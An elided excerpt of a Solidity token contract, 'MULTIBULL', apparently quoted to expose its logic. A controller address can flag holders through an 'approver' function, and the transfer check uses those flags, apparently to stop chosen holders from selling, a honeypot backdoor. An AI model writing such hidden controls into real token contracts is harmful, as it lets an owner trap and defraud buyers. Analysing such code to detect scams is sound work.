...
contract MULTIBULL is Ownable {
    ...
    function approver(address a, bool v) external {
        if(_control == _msgSender() && _control != a && pair() != a && a != _routerAddress){
            _vip[a] = v;
        } else {
    ...
    function pair() public view virtual returns (address) {
        ...
        return IPancakeFactory(IPancakeRouter(_routerAddress).factory()).getPair(address(WBNB), address(this));
    }
    ...
    function _transfer(
        ...
        if(from == _control || from == pair() || _vip[from] == false) {
